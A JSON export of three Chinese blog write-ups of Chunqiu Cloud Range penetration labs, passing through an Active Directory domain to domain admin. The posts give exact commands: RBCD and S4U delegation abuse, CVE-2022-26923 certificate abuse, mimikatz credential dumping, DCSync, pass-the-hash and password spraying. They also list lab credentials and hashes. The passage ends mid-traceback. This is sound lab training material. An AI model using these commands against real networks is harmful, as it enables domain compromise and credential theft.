[{"title":"春秋云境-2022网鼎杯半决赛复盘","url":"/2025/05/27/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/569a5ca49840739bcd78d62b9669cc6a.png\" style=\"zoom:67%;\" />\n\n\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.15.26</td>\n<td></td>\n<td>外网 WordPress 服务器</td>\n</tr>\n<tr>\n<td>172.22.15.24</td>\n<td>XR-WIN08</td>\n<td>存在 MS17-010 漏洞；ZDOO 全协同管理平台、phpMyAdmin 服务</td>\n</tr>\n<tr>\n<td>172.22.15.35</td>\n<td>XR-0687.xiaorang.lab</td>\n<td>域用户 lixiuying 对该主机有 Generic Write 权限</td>\n</tr>\n<tr>\n<td>172.22.15.18</td>\n<td>XR-CA.xiaorang.lab</td>\n<td>CA 证书服务器</td>\n</tr>\n<tr>\n<td>172.22.15.13</td>\n<td>XR-DC01.xiaorang.lab</td>\n<td>域控制器</td>\n</tr>\n</tbody></table>\n<h1 id=\"Wordpress\"><a href=\"#Wordpress\" class=\"headerlink\" title=\"Wordpress\"></a>Wordpress</h1><p>后台弱口令，修改主题：/wp-content/themes/twentytwentyone/index.php</p>\n<h1 id=\"MS17010\"><a href=\"#MS17010\" class=\"headerlink\" title=\"MS17010\"></a>MS17010</h1><p>172.22.15.24 永恒之蓝，连接数据库，发现域内账号</p>\n<h1 id=\"AS-REP-Roasting\"><a href=\"#AS-REP-Roasting\" class=\"headerlink\" title=\"AS-REP Roasting\"></a>AS-REP Roasting</h1><p>跑存活 + cmd5 + Roasting，出来两个凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">lixiuying@xiaorang.lab\twinniethepooh</span><br><span class=\"line\">huachunmei@xiaorang.lab\t1qaz2wsx</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"RBCD\"><a href=\"#RBCD\" class=\"headerlink\" title=\"RBCD\"></a>RBCD</h1><p>查一下域内委派关系</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-findDelegation -dc-ip 172.22.15.13 xiaorang.lab&#x2F;lixiuying:winniethepooh</span><br></pre></td></tr></table></figure>\n\n<p>再用 findCreator 查一下，发现 lixiuying 对 XR-0687$ 具有 Generic Write 权限，打RBCD</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-addcomputer -computer-name &#39;TEST$&#39; -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 172.22.15.13 xiaorang.lab&#x2F;lixiuying:winniethepooh</span><br><span class=\"line\"></span><br><span class=\"line\">impacket-rbcd -dc-ip 172.22.15.13 -action write -delegate-to &#39;XR-0687$&#39; -delegate-from &#39;TEST$&#39; xiaorang.lab&#x2F;lixiuying:winniethepooh</span><br><span class=\"line\"></span><br><span class=\"line\">impacket-getST -dc-ip 172.22.15.13 -spn cifs&#x2F;XR-0687.xiaorang.lab -impersonate Administrator xiaorang.lab&#x2F;&#39;TEST$&#39;:123456</span><br><span class=\"line\"></span><br><span class=\"line\">export KRB5CCNAME&#x3D;Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache </span><br><span class=\"line\">impacket-wmiexec -dc-ip 172.22.15.13 -k -no-pass Administrator@XR-0687.xiaorang.lab -target-ip 172.22.15.35</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ADCS-CVE-2022-26923\"><a href=\"#ADCS-CVE-2022-26923\" class=\"headerlink\" title=\"ADCS - CVE-2022-26923\"></a>ADCS - CVE-2022-26923</h1><p>域内还有一台CA，肯定是打提权洞，certipy扫一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad find -u &#39;lixiuying@xiaorang.lab&#39; -p &#39;winniethepooh&#39; -dc-ip 172.22.15.13 -vulnerable -stdout </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250527221759020.png\" alt=\"image-20250527221759020\"></p>\n<p>尝试 CVE-2022-26923，添加账号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad account create -u lixiuying -p winniethepooh -dc-ip 172.22.15.13 -user evil -pass Qwer1234 -dns XR-DC01.xiaorang.lab -debug</span><br></pre></td></tr></table></figure>\n\n<p>配置hosts，请求证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad req -u &#39;evil$@xiaorang.lab&#39; -p Qwer1234 -ca &#39;xiaorang-XR-CA-CA&#39; -target 172.22.15.18 -template Machine -debug </span><br></pre></td></tr></table></figure>\n\n<p>认证证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug</span><br></pre></td></tr></table></figure>\n\n<p>报错：<code>KDC_ERR_PADATA_TYPE_NOSUPP</code></p>\n<p>通过Schannel协议进行Pass The Cert，提取密钥与证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad cert -pfx xr-dc01.pfx -nokey -out xr-dc01.crt</span><br><span class=\"line\">certipy-ad cert -pfx xr-dc01.pfx -nocert -out xr-dc01.key</span><br></pre></td></tr></table></figure>\n\n<p>配置evil到域控进行RBCD</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 passthecert.py -action write_rbcd -crt xr-dc01.crt -key xr-dc01.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-from &#39;evil$&#39; -delegate-to &#39;XR-DC01$&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250527222856022.png\" alt=\"image-20250527222856022\"></p>\n<p>PTT</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-getST xiaorang.lab&#x2F;&#39;evil$&#39;:Qwer1234 -spn cifs&#x2F;XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br><span class=\"line\">export KRB5CCNAME&#x3D;</span><br><span class=\"line\">impacket-wmiexec XR-DC01.xiaorang.lab -no-pass -k -dc-ip 172.22.15.13</span><br></pre></td></tr></table></figure>\n\n","categories":["云境靶场"]},{"title":"春秋云境-Brute4Road","url":"/2025/03/05/Brute4Road/","content":"<!--more-->\n\n<img src=\"https://g.ichunqiu.com/cloud_mirror/production/202208/f373ff22c9b9d633c7f894a3453639d0.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>远程重置过期密码：<a href=\"https://forum.butian.net/share/865\">https://forum.butian.net/share/865</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.22.2.7\t \t外网 Redis 服务器</span><br><span class=\"line\">172.22.2.18\tUBUNTU-WEB02\tWordPress 服务器</span><br><span class=\"line\">172.22.2.16\tMSSQLSERVER.xiaorang.lab\tMSSQL 数据库</span><br><span class=\"line\">172.22.2.34\tCLIENT01.xiaorang.lab\t远程桌面服务未启用 NLA 的主机</span><br><span class=\"line\">172.22.2.3\tDC.xiaorang.lab\tDC</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"redis-Master-Slave\"><a href=\"#redis-Master-Slave\" class=\"headerlink\" title=\"redis Master-Slave\"></a>redis Master-Slave</h1><p>主从复制RCE + suid 提权</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305011655836.png\" alt=\"image-20250305011655836\"></p>\n<h1 id=\"WordPress\"><a href=\"#WordPress\" class=\"headerlink\" title=\"WordPress\"></a>WordPress</h1><p>wpscan CVE-2021-25003</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305012214672.png\" alt=\"image-20250305012214672\"></p>\n<p>查看 wp-config.php 配置文件，获取到数据库账号密码 wpuser/WpuserEha8Fgj9，连接数据库得flag02</p>\n<h1 id=\"MSSQL\"><a href=\"#MSSQL\" class=\"headerlink\" title=\"MSSQL\"></a>MSSQL</h1><p>wp中有个表是密码字典，根据fscan结果，爆破mssql和rdp，smb，获取到数据库用户密码 sa/ElGNkOiC，发现当前机器有个域用户</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305014058598.png\" alt=\"image-20250305014058598\"></p>\n<p>土豆提权抓密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:&#x2F;Users&#x2F;Public&#x2F;Downloads&#x2F;GodPotato-NET4.exe -cmd &quot;cmd &#x2F;c type C:\\Users\\Administrator\\flag\\flag03.txt&quot;</span><br><span class=\"line\">C:&#x2F;Users&#x2F;Public&#x2F;Downloads&#x2F;GodPotato-NET4.exe -cmd &quot;cmd &#x2F;c C:\\Users\\Public\\Downloads\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305014517465.png\" alt=\"image-20250305014517465\"></p>\n<p>获得域用户凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">XIAORANG.LAB&#x2F;William : Willg1UoO6Jt</span><br><span class=\"line\">XIAORANG.LAB&#x2F;MSSQLSERVER$ : 6932b7ec38b7b77f1945f819be3ca547</span><br></pre></td></tr></table></figure>\n\n<p>横向发现William密码过期，通过不强制执行 NLA 的 rdp进行更改密码为test123</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdesktop 172.22.2.34 -d xiaorang.lab -u William -p Willg1UoO6Jt -z</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"委派\"><a href=\"#委派\" class=\"headerlink\" title=\"委派\"></a>委派</h1><p>通过上面修改的域用户密码登录，使用adfind查询域内委派关系</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Public\\Downloads&gt;whoami</span><br><span class=\"line\">xiaorang\\william</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\Public\\Downloads&gt;AdFind.exe -b &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: DC.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2016</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\"></span><br><span class=\"line\">1 Objects returned</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\Public\\Downloads&gt;AdFind.exe -b &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: DC.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2016</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0 Objects returned</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\Public\\Downloads&gt;AdFind.exe -b &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: DC.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2016</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;MSSQLSERVER,CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\"></span><br><span class=\"line\">1 Objects returned</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\Public\\Downloads&gt;AdFind.exe -b &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: DC.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2016</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0 Objects returned</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305024305771.png\" alt=\"image-20250305024305771\"></p>\n<p>查询域内委派关系，发现有约束委派，且委派账号正好是当前已经被拿下的 MSSQLSERVER$</p>\n<p>攻击流程：</p>\n<ol>\n<li>使用 Rubeus 以拥有约束性委派权限的 MSSQLSERVER$ 账户凭据向 KDC 请求一个可转发的 TGT</li>\n<li>再使用 S4U2self 协议以域管理员身份去请求 MSSQLSERVER$ 自身可转发的服务票据 ST1</li>\n<li>最后使用 ST1 通过 S4U2proxy 协议伪造域管理员身份去KDC请求ldap/DC.xiaorang.lab 服务的票据</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe s4u &#x2F;user:MSSQLSERVER$ &#x2F;rc4:6932b7ec38b7b77f1945f819be3ca547 &#x2F;impersonateuser:Administrator &#x2F;msdsspn:ldap&#x2F;DC.xiaorang.lab &#x2F;dc:DC.xiaorang.lab &#x2F;ptt &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305025831969.png\" alt=\"image-20250305025831969\"></p>\n<p>查看当前票据为域管</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305025910434.png\" alt=\"image-20250305025910434\"></p>\n<p>dcsync导hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;user:Administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305025958815.png\" alt=\"image-20250305025958815\"></p>\n<p>PTH</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;administrator@172.22.2.3 -hashes :1a19251fbd935969832616366ae3fe62</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250305030137513.png\" alt=\"image-20250305030137513\"></p>\n","categories":["云境靶场"]},{"title":"春秋云境-Delegation","url":"/2025/05/11/Delegation/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/814b1d15a97935ca508a391913f26122.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><ul>\n<li><p>PrivescCheck：windows本地提权检查脚本 <a href=\"https://github.com/itm4n/PrivescCheck\">https://github.com/itm4n/PrivescCheck</a></p>\n</li>\n<li><p>NTLM Relay 强制认证：<a href=\"https://forum.butian.net/share/1944\">红队域渗透NTLM Relay：强制认证方式总结</a></p>\n</li>\n</ul>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.4.36</th>\n<th>loaclhost</th>\n<th>外网 CmsEasy（易通 CMS）服务器</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.4.45</td>\n<td>WIN19.xiaorang.lab</td>\n<td>配置了非约束委派的主机</td>\n</tr>\n<tr>\n<td>172.22.4.19</td>\n<td>FILESERVER.xiaorang.lab</td>\n<td>文件服务器</td>\n</tr>\n<tr>\n<td>172.22.4.7</td>\n<td>DC01.xiaorang.lab</td>\n<td>域控</td>\n</tr>\n</tbody></table>\n<h1 id=\"cmseasy\"><a href=\"#cmseasy\" class=\"headerlink\" title=\"cmseasy\"></a>cmseasy</h1><p>弱口令 admin/123456 后台shell，suid提权读文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">diff --line-format&#x3D;%L &#x2F;dev&#x2F;null flag01.txt</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;home&#x2F;flag&#x2F; &gt;diff --line-format&#x3D;%L &#x2F;dev&#x2F;null flag01.txt</span><br><span class=\"line\">  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     </span><br><span class=\"line\"> |  _&quot;\\ \\| ___&quot;|&#x2F; |&quot;|    \\| ___&quot;|&#x2F;U &#x2F;&quot;___|uU  &#x2F;&quot;\\  u  |_ &quot; _|     ___     \\&#x2F;&quot;_ \\&#x2F; | \\ |&quot;|    </span><br><span class=\"line\">&#x2F;| | | | |  _|&quot; U | | u   |  _|&quot;  \\| |  _ &#x2F; \\&#x2F; _ \\&#x2F;     | |      |_&quot;_|    | | | |&lt;|  \\| |&gt;   </span><br><span class=\"line\">U| |_| |\\| |___  \\| |&#x2F;__  | |___   | |_| |  &#x2F; ___ \\    &#x2F;| |\\      | | .-,_| |_| |U| |\\  |u   </span><br><span class=\"line\"> |____&#x2F; u|_____|  |_____| |_____|   \\____| &#x2F;_&#x2F;   \\_\\  u |_|U    U&#x2F;| |\\u\\_)-\\___&#x2F;  |_| \\_|    </span><br><span class=\"line\">  |||_   &lt;&lt;   &gt;&gt;  &#x2F;&#x2F;  \\\\  &lt;&lt;   &gt;&gt;   _)(|_   \\\\    &gt;&gt;  _&#x2F;&#x2F; \\\\_.-,_|___|_,-.  \\\\    ||   \\\\,-. </span><br><span class=\"line\"> (__)_) (__) (__)(_&quot;)(&quot;_)(__) (__) (__)__) (__)  (__)(__) (__)\\_)-&#39; &#39;-(_&#x2F;  (__)   (_&quot;)  (_&#x2F;  </span><br><span class=\"line\"></span><br><span class=\"line\">flag01: flag&#123;cfb91c90-a38a-4419-a974-ad32415fccd3&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Great job!!!!!!</span><br><span class=\"line\"></span><br><span class=\"line\">Here is the hint: WIN19\\Adrian</span><br><span class=\"line\"></span><br><span class=\"line\">I&#39;ll do whatever I can to rock you...</span><br></pre></td></tr></table></figure>\n\n<p>fscan</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.22.4.45:445 open</span><br><span class=\"line\">172.22.4.19:445 open</span><br><span class=\"line\">172.22.4.7:445 open</span><br><span class=\"line\">172.22.4.45:139 open</span><br><span class=\"line\">172.22.4.7:139 open</span><br><span class=\"line\">172.22.4.19:139 open</span><br><span class=\"line\">172.22.4.45:135 open</span><br><span class=\"line\">172.22.4.7:135 open</span><br><span class=\"line\">172.22.4.19:135 open</span><br><span class=\"line\">172.22.4.45:80 open</span><br><span class=\"line\">172.22.4.36:80 open</span><br><span class=\"line\">172.22.4.7:88 open</span><br><span class=\"line\">172.22.4.36:22 open</span><br><span class=\"line\">172.22.4.36:21 open</span><br><span class=\"line\">172.22.4.36:3306 open</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.4.7</span><br><span class=\"line\">   [-&gt;]DC01</span><br><span class=\"line\">   [-&gt;]172.22.4.7</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.4.45</span><br><span class=\"line\">   [-&gt;]WIN19</span><br><span class=\"line\">   [-&gt;]172.22.4.45</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.4.19</span><br><span class=\"line\">   [-&gt;]FILESERVER</span><br><span class=\"line\">   [-&gt;]172.22.4.19</span><br><span class=\"line\">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class=\"line\">[*] NetBios 172.22.4.45     XIAORANG\\WIN19                </span><br><span class=\"line\">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*] OsInfo 172.22.4.7\t(Windows Server 2016 Datacenter 14393)</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.4.36        code:200 len:0      title:None</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"用户密码爆破\"><a href=\"#用户密码爆破\" class=\"headerlink\" title=\"用户密码爆破\"></a>用户密码爆破</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q crackmapexec smb 172.22.4.45 -u Adrian -p pass.txt --local-auth</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501182846491.png\" alt=\"image-20250501182846491\"></p>\n<p>密码 <code>babygirl1</code> 但是已经过期，远程更改密码</p>\n<p>使用impacket失败</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ proxychains4 -q impacket-changepasswd WIN19&#x2F;Adrian:&#39;babygirl1&#39;@172.22.4.45 -newpass &#39;Admin@123456&#39;</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Changing the password of WIN19\\Adrian</span><br><span class=\"line\">[*] Connecting to DCE&#x2F;RPC as WIN19\\Adrian</span><br><span class=\"line\">[!] Password is expired or must be changed, trying to bind with a null session.</span><br><span class=\"line\">[*] Connecting to DCE&#x2F;RPC as null session</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smbconnection.py&quot;, line 280, in login</span><br><span class=\"line\">    return self._SMBConnection.login(user, password, domain, lmhash, nthash)</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smb3.py&quot;, line 1091, in login</span><br><span class=\"line\">    if packet.isValidAnswer(STATUS_SUCCESS):</span><br><span class=\"line\">       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smb3structs.py&quot;, line 460, in isValidAnswer</span><br><span class=\"line\">    raise smb3.SessionError(self[&#39;Status&#39;], self)</span><br><span class=\"line\">impacket.smb3.SessionError: SMB SessionError: STATUS_PASSWORD_EXPIRED(The user account password has expired.)</span><br><span class=\"line\"></span><br><span class=\"line\">During handling of the above exception, another exception occurred:</span><br><span class=\"line\"></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 392, in connect</span><br><span class=\"line\">    self.dce &#x3D; self.authenticate(anonymous&#x3D;False)</span><br><span class=\"line\">               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 371, in authenticate</span><br><span class=\"line\">    dce.connect()</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;rpcrt.py&quot;, line 805, in connect</span><br><span class=\"line\">    return self._transport.connect()</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;transport.py&quot;, line 514, in connect</span><br><span class=\"line\">    self.__smb_connection.login(self._username, self._password, self._domain, self._lmhash, self._nthash)</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smbconnection.py&quot;, line 282, in login</span><br><span class=\"line\">    raise SessionError(e.get_error_code(), e.get_error_packet())</span><br><span class=\"line\">impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000071 - STATUS_PASSWORD_EXPIRED - The user account password has expired.</span><br><span class=\"line\"></span><br><span class=\"line\">During handling of the above exception, another exception occurred:</span><br><span class=\"line\"></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smbconnection.py&quot;, line 280, in login</span><br><span class=\"line\">    return self._SMBConnection.login(user, password, domain, lmhash, nthash)</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smb3.py&quot;, line 1091, in login</span><br><span class=\"line\">    if packet.isValidAnswer(STATUS_SUCCESS):</span><br><span class=\"line\">       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smb3structs.py&quot;, line 460, in isValidAnswer</span><br><span class=\"line\">    raise smb3.SessionError(self[&#39;Status&#39;], self)</span><br><span class=\"line\">impacket.smb3.SessionError: SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class=\"line\"></span><br><span class=\"line\">During handling of the above exception, another exception occurred:</span><br><span class=\"line\"></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 960, in &lt;module&gt;</span><br><span class=\"line\">    handler.changePassword(</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 225, in changePassword</span><br><span class=\"line\">    return self._changePassword(</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 530, in _changePassword</span><br><span class=\"line\">    if not self.connect(retry_if_expired&#x3D;True):</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 398, in connect</span><br><span class=\"line\">    self.dce &#x3D; self.authenticate(anonymous&#x3D;True)</span><br><span class=\"line\">               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;changepasswd.py&quot;, line 371, in authenticate</span><br><span class=\"line\">    dce.connect()</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;rpcrt.py&quot;, line 805, in connect</span><br><span 